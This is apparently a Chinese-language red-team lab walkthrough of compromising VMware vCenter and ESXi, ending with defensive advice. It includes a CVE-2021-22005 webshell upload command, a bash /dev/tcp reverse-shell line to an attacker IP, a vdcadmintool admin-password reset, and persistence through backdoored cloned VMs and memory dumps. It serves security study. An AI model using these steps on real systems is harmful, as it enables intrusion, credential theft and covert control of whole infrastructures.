@@ -1,0 +1,554 @@
+云计算的本质不是“云”，而是虚拟化 + 自动化管理。
+当企业把服务器搬进数据中心，真正控制整个基础设施的不是某台 Linux 或 Windows，而是虚拟化平台。
+
+一旦虚拟化层被攻陷，攻击者获得的不是一台机器，而是：
+
+整个服务器集群
+
+所有虚拟机
+
+所有网络
+
+所有存储
+
+
+换句话说，虚拟化层就是现代企业的“上帝权限”。
+
+在红队、APT、云安全研究中，vCenter 与 ESXi 后渗透是非常核心的一环。
+
+本文将从 虚拟化技术原理 → vCenter 架构 → 漏洞利用 → 后渗透控制 → 虚拟机持久化控制，完整复盘一条真实的云攻防路径。
+
+
+---
+
+一、虚拟化技术基础
+
+理解云攻防之前，需要先理解虚拟化系统的结构。
+
+主流虚拟化技术：
+
+技术	类型	典型用途
+
+VMware ESXi	Type1 Hypervisor	企业虚拟化
+vCenter	管理平台	集群管理
+KVM	Linux Hypervisor	OpenStack
+QEMU	模拟器	虚拟硬件
+OpenStack	云平台	私有云
+
+
+其中 VMware 体系是企业最常见的。
+
+结构如下：
+
+物理服务器
+     │
+     ▼
+VMware ESXi (Hypervisor)
+     │
+     ▼
+虚拟机 (Windows / Linux)
+     │
+     ▼
+应用系统
+
+如果是企业集群环境：
+
+物理服务器1 ── ESXi
+物理服务器2 ── ESXi
+物理服务器3 ── ESXi
+       │
+       ▼
+    vCenter
+(统一管理所有主机)
+
+这里有一个关键点：
+
+ESXi 是虚拟化内核
+vCenter 是管理大脑
+
+攻击者通常优先攻击 vCenter，因为：
+
+可以统一控制所有 ESXi
+
+可以直接操作虚拟机
+
+可以克隆虚拟机
+
+可以获取管理员权限
+
+可以植入后门
+
+
+
+---
+
+二、ESXi 与 vCenter 架构解析
+
+ESXi
+
+ESXi 是 裸金属 Hypervisor
+
+特点：
+
+直接安装在服务器
+
+不依赖操作系统
+
+资源利用率高
+
+安全边界强
+
+
+ESXi 负责：
+
+CPU 虚拟化
+
+内存管理
+
+虚拟网络
+
+虚拟存储
+
+虚拟机运行
+
+
+
+---
+
+vCenter Server
+
+vCenter 是 集中管理平台
+
+功能包括：
+
+管理 ESXi 主机
+
+管理虚拟机
+
+管理存储
+
+管理网络
+
+自动化部署
+
+
+核心组件：
+
+vpxd        管理服务
+vmdir       目录服务
+vpostgres   数据库
+vsphere-ui  Web管理界面
+
+攻击者最常攻击的是：
+
+vsphere-ui
+
+因为这是 Web 服务。
+
+
+---
+
+三、实验环境
+
+靶场项目：
+
+https://github.com/crow821/vulntarget
+
+环境如下：
+
+系统	IP	账号
+
+ESXi	192.168.10.128	root / Vulntarget@123
+vCenter	192.168.10.129	administrator@vsphere.local
+Windows7	DHCP	vulntarget / Vulntarget
+
+
+下载资源：
+
+百度云
+https://pan.baidu.com/s/1sv9qdioNF4PTUliix5HEfg
+提取码：2dwq
+
+夸克网盘
+https://pan.quark.cn/s/e65bf3efbf0b
+
+
+---
+
+四、环境搭建
+
+1 开启 CPU 虚拟化
+
+进入 BIOS：
+
+Intel VT-x
+AMD-V
+
+必须开启。
+
+否则 ESXi 无法运行虚拟机。
+
+
+---
+
+2 网络配置
+
+通常配置为：
+
+VMnet8 (NAT)
+
+网络示例：
+
+攻击机      192.168.10.1
+ESXi        192.168.10.128
+vCenter     192.168.10.129
+Windows7    DHCP
+
+
+---
+
+五、攻击 vCenter（CVE-2021-22005）
+
+这是 VMware 的一个 文件上传漏洞。
+
+漏洞位置：
+
+/analytics/telemetry/ph/api/hyper/send
+
+攻击者可以：
+
+上传 JSP Webshell
+
+远程执行命令
+
+
+漏洞利用代码：
+
+https://github.com/shmilylty/cve-2021-22005-exp
+
+执行：
+
+python exp.py -s gsl.jsp -t https://192.168.10.129/
+
+上传成功后：
+
+https://target/ui/resources/gsl.jsp
+
+
+---
+
+六、获取反弹 Shell
+
+在 Webshell 中执行：
+
+bash -i >& /dev/tcp/192.168.10.1/8888 0>&1
+
+监听：
+
+nc -lvvp 8888
+
+成功获得：
+
+vcenter shell
+
+此时权限通常为：
+
+vsphere-ui
+
+
+---
+
+七、vCenter 权限提升
+
+vCenter 内部有一个关键工具：
+
+vdcadmintool
+
+Linux 路径：
+
+/usr/lib/vmware-vmdir/bin/vdcadmintool
+
+Windows：
+
+C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe
+
+执行：
+
+vdcadmintool
+
+选择：
+
+1 Reset password
+
+可以重置：
+
+administrator@vsphere.local
+
+密码。
+
+于是攻击者获得：
+
+vCenter 管理员权限
+
+
+---
+
+八、接管整个虚拟化平台
+
+登录：
+
+https://192.168.10.129
+
+输入新密码。
+
+进入 vSphere Web Client
+
+此时可以：
+
+查看所有 ESXi
+
+查看所有虚拟机
+
+创建虚拟机
+
+克隆虚拟机
+
+控制电源
+
+获取控制台
+
+
+这意味着：
+
+攻击者接管整个数据中心。
+
+
+---
+
+九、虚拟机后渗透
+
+获得 vCenter 后，可以直接进入虚拟机控制台。
+
+例如 Windows7。
+
+无需：
+
+RDP
+
+SSH
+
+账号密码
+
+
+因为 vCenter 是 hypervisor 管理者。
+
+
+---
+
+十、克隆后门虚拟机
+
+这是云环境中最隐蔽的持久化方式之一。
+
+攻击流程：
+
+1 创建恶意虚拟机 2 植入后门 3 克隆 4 伪装为正常系统
+
+后门镜像：
+
+https://pan.baidu.com/s/14_OP_nePf-HUlkZxzwXkXw
+
+上传到：
+
+datastore
+
+然后：
+
+Deploy VM
+
+
+---
+
+十一、持久化控制
+
+攻击者可以：
+
+1 创建隐藏虚拟机
+
+隐藏在资源池。
+
+2 创建计划任务
+
+自动执行脚本。
+
+3 创建虚拟网络监听
+
+监听所有 VM 流量。
+
+4 VM Snapshot
+
+回滚系统。
+
+5 VM Clone
+
+批量植入后门。
+
+
+---
+
+十二、APT 常用虚拟化攻击手段
+
+在真实攻击中，APT 非常喜欢攻击虚拟化层。
+
+原因很简单：
+
+一旦成功，就是基础设施级控制。
+
+常见技术：
+
+1 vCenter RCE
+
+漏洞：
+
+CVE-2021-22005
+
+CVE-2021-21985
+
+CVE-2023-20887
+
+
+
+---
+
+2 ESXi SSH 控制
+
+获取：
+
+root
+
+权限。
+
+
+---
+
+3 虚拟机内存提取
+
+直接 dump：
+
+vmem
+
+获取：
+
+密码
+
+Token
+
+会话
+
+
+
+---
+
+4 虚拟网络监听
+
+监听：
+
+VSwitch
+
+流量。
+
+
+---
+
+5 批量虚拟机植入
+
+通过：
+
+VM template
+
+传播后门。
+
+
+---
+
+十三、防御建议
+
+企业必须重点保护：
+
+vCenter
+
+防御措施：
+
+1 网络隔离
+
+不要暴露：
+
+443
+5480
+
+到公网。
+
+
+---
+
+2 更新补丁
+
+及时修复 VMware 漏洞。
+
+
+---
+
+3 MFA 登录
+
+vCenter 必须开启：
+
+多因素认证
+
+
+---
+
+4 日志监控
+
+重点监控：
+
+/var/log/vmware
+
+
+---
+
+5 最小权限
+
+不要使用：
+
+administrator
+
+进行日常操作。
+
+
+---
+
+结语
+
+在传统安全模型中：
+
+攻击者控制一台服务器。
+
+但在云时代：
+
+攻击者更希望控制 虚拟化平台。
+
+因为那里是：
+
+整个数据中心的控制台。
+
+攻破 vCenter 的意义，相当于拿到了一栋大楼的：
+
+总电源
+
+总网络
+
+总监控
+
+
+现代攻防的战场已经从“主机”上升到了 基础设施层。
+
+而虚拟化层，正是云安全最关键的一道防线。
